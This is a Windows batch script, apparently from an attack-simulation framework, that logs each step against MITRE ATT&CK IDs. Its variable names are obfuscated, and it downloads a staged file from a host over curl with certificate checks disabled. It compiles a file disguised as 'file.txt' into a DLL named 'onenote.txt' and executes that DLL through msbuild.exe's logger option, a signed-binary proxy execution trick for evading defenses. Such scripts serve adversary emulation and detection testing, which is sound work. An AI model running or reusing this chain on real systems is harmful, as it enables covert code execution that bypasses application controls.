@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\10153\b0d7da33
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?10153-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=onenote.txt
SET njozco=file.txt
SET kkjwr=10153
SET logvar=%APPDATA%\%ufeybybm%\macula-simulations.log
SET vbqzc=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
SET mqbqzc=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!logvar!" 2>nul
curl -k -s -o nul "!uouoq!"
SET rcrg=%errorlevel%
IF !rcrg!==0 (SET zz=1&SET dfg=) ELSE (SET zz=0&SET dfg=connection_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_end=!rcrg!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1105|Ingress Tool Transfer=!zz!:!dfg!>> "!logvar!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!logvar!" 2>nul
cd /d "!recnn!" >nul 2>&1
SET exo=%errorlevel%
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_end=!exo!>> "!logvar!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!logvar!" 2>nul
"!vbqzc!" /target:library /reference:Microsoft.Build.Framework.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
SET cldw=%errorlevel%
IF !cldw!==0 (SET rf=1&SET wde=) ELSE (SET rf=0&SET wde=compile_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_end=!cldw!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!rf!:!wde!>> "!logvar!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execute_start=!mqbqzc!>> "!logvar!" 2>nul
"!mqbqzc!" /logger:LoggerEntry,"!hpnjatpj!;MyParameters,Foo" >nul 2>&1
SET bmhr=%errorlevel%
IF !bmhr!==0 (SET mhu=1&SET hmn=) ELSE (SET mhu=0&SET hmn=execution_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execute_end=!bmhr!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!mhu!:!hmn!>> "!logvar!" 2>nul